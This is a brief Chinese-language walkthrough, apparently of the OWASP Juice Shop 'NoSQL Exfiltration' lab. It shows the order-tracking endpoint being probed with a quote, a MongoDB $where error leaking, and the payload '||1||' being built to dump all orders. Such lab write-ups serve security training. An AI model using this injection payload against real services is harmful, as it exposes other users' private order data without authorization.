---
title: NoSQL Exfiltration
description: 经典的 MongoDB 字符串端点探测与注入
---
- 描述：所有你的订单都属于我们！即使是那些不属于我们的。
- 在订单历史功能中
```http://127.0.0.1:3000/#/order-history```
    查看订单详细信息 
    ```http://127.0.0.1:3000/#/track-result?id=130f-7dd45d975fc80569```
    对应请求为 
    ```GET /rest/track-order/130f-7dd45d975fc80569 HTTP/1.1```
    其中 URL 参数为订单的 ```orderId```
- 探测
    - 注入一个单引号 ```GET /rest/track-order/' HTTP/1.1```
        响应包含详细错误信息
        ```   
        "message": "Invalid or unexpected token",
        "stack": "SyntaxError: Invalid or unexpected token
            at Function (<anonymous>)
                at Object.$where
        ```
        - 与之前的 NoSQL 注入相同，注入点仍为 MongoDB 的 where 子句中
    - 注入转义单引号 ```\'```
        响应 ```"orderId":"\\'"```
        - 不同在于此处位于引号内
- 设计攻击向量
    - ```'||1||'```
        闭合前后单引号，使用或创建布尔值 true
    - 对转义后的 URL 的请求将返回全部订单 
        ```/rest/track-order/'||1||'```